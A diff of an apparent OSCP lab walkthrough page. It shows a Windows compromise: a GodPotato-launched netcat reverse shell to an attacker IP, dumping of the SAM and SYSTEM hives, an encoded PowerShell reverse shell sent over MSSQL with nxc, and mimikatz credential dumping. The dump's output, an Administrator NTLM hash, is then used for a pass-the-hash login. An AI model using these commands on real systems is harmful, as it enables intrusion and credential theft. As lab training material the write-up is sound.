@@ -14,7 +14,7 @@ I start by connecting to the session via evil winrm and look at the double NIC:
 
 I quickly see me have&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So i upload netcat and godpotato to the machine and launch the command to get a reverse shell:
 
@@ -25,7 +25,7 @@ nc -nlvp 1234
 ./GodPotato-NET4.exe -cmd "nc.exe -e cmd.exe 192.168.45.249 1234"
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So we have admin access so i go and look at the command to exfiltrate the hives:
 
@@ -39,7 +39,7 @@ reg save HKLM\SYSTEM "C:\Users\eric.wallows\Desktop\system.save"
 
 Then i download everything to my attackbox:
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then i dump everything with this command:
 
@@ -114,14 +114,57 @@ nxc mssql 10.10.86.148 -u sql_svc -p 'Dolphin1' -x 'powershell -e JABjAGwAaQBlAG
 
 and i get my reverse shell:
 
-<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 I can upload files, not with wget or certutil but the  put-file module on nxc, ILY nxc
 
-<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I try to privesc, to download the files in windows old, and all but no success so i upload mimikatz on the machine and try some stuff:
 
 ```
 .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
 ```
+
+Since the user sql\_svc has impersonate i use godpotato:
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+and after running mimikatz:
+
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```
+Authentication Id : 0 ; 441378 (00000000:0006bc22)                                                                  
+Session           : Interactive from 1                                                                              
+User Name         : Administrator                                                                                   
+Domain            : OSCP                                                                                            
+Logon Server      : DC01                                                                                            
+Logon Time        : 2/12/2025 12:40:32 PM                                                                           
+SID               : S-1-5-21-2610934713-1581164095-2706428072-500                                                   
+        msv :                                                                                                       
+         [00000003] Primary                                                                                         
+         * Username : Administrator                                                                                 
+         * Domain   : OSCP                                                                                          
+         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5                                                              
+         * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17                                                      
+         * DPAPI    : 959ad2ea78c63aebf3233679ad90d769                                                              
+        tspkg :                                                                                                     
+        wdigest :                                                                                                   
+         * Username : Administrator                                                                                 
+         * Domain   : OSCP                                                                                          
+         * Password : (null)                                                                                        
+        kerberos :                                                                                                  
+         * Username : Administrator                                                                                 
+         * Domain   : OSCP.EXAM                                                                                     
+         * Password : (null)                                                                                        
+        ssp :                                                                                                       
+        credman :                                                                                                   
+        cloudap :
+```
+
+<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>evil-winrm -i 10.10.86.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5</p></figcaption></figure>
